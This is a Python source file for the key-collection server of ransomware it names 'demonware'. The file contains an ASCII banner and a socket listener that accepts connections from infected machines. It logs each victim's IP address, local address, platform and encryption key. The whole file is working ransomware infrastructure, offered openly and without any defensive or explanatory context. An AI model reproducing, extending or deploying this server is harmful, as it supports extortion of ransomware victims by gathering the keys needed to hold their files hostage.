#/usr/bin/env python
import os, sys, socket, select, argparse

if len(sys.argv) < 2:
    print('\033[31m[ERROR]\033[0m Please, set a port'); sys.exit(1)

def parse_args():
    # Create the arguments
    parser = argparse.ArgumentParser(description='Server for demonware ransomware')
    parser.add_argument("-i", "--ip", help="Host the server on given interface ip")
    parser.add_argument("-p", "--port", help="Host the server on the given port")
    return parser.parse_args()

args = parse_args()

if not args.ip:
    host = '127.0.0.1'
else:
    host = args.ip

socket_list = []
port = int(args.port)

def header():
    header = 'Remote'.ljust(20), 'Local'.ljust(20), 'Platform'.ljust(20), 'key'
    print('\033[37m{0[0]} {0[1]} {0[2]} {0[3]}\033[0m'.format(header))

banner = '''\033[31m
                 .:'                                  `:.
                 ::'                                    `::
                :: :.                                  .: ::
                 `:. `:.             .             .:'  .:'
                  `::. `::           !           ::' .::'
                      `::.`::.    .' ! `.    .::'.::'
                        `:.  `::::'':!:``::::'   ::'
                        :'*:::.  .:' ! `:.  .:::*`:
                       :: HHH::.   ` ! '   .::HHH ::
                      ::: `H TH::.  `!'  .::HT H' :::
                      ::..  `THHH:`:   :':HHHT'  ..::
                      `::      `T: `. .' :T'      ::'
                        `:. .   :         :   . .:'
                          `::'               `::'
                            :'  .`.  .  .'.  `:
                            :' ::.       .:: `:
                            :' `:::     :::' `:
                             `.  ``     ''  .'
                              :`...........':
                              ` :`.     .': '
                               `:  `"""'  :'
 ______   _______  _______  _______  _                 _______  _______  _______
(  __  \ (  ____ \(       )(  ___  )( (    /||\     /|(  ___  )(  ____ )(  ____ \\
| (  \  )| (    \/| () () || (   ) ||  \  ( || )   ( || (   ) || (    )|| (    \/
| |   ) || (__    | || || || |   | ||   \ | || | _ | || (___) || (____)|| (__
| |   | ||  __)   | |(_)| || |   | || (\ \) || |( )| ||  ___  ||     __)|  __)
| |   ) || (      | |   | || |   | || | \   || || || || (   ) || (\ (   | (
| (__/  )| (____/\| )   ( || (___) || )  \  || () () || )   ( || ) \ \__| (____/\\
(______/ (_______/|/     \|(_______)|/    )_)(_______)|/     \||/   \__/(_______/
\033[0m
'''

def server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(10)

    # add server socket object to the list of readable connections
    socket_list.append(server_socket)

    print(banner)
    print("\033[32mServer started on port [%s] [%s]\nWaiting...\n\033[0m" % (host, int(port)))
    header() # Print the header

    try:
        while True:
            ready_to_read,ready_to_write,in_error = select.select(socket_list,[],[],0)

            for sock in ready_to_read:
                # a new connection request recieved
                if sock == server_socket:
                    sockfd, addr = server_socket.accept()
                    socket_list.append(sockfd)
                else:
                    try:
                        data = sock.recv(1024)
                        if data:
                            ip = addr[0]
                            local = data.split('$')[0]
                            system = data.split('$')[1]
                            key = data.split('$')[2]

                            print('%s %s %s %s' % (ip.ljust(20), local.ljust(20), system.ljust(20), key))

                        else:
                            if sock in socket_list:
                                socket_list.remove(sock)
                    except:
                        continue
    except KeyboardInterrupt:
        print('Closed...\n')


    server_socket.close()

if __name__ == "__main__":
    sys.exit(server())
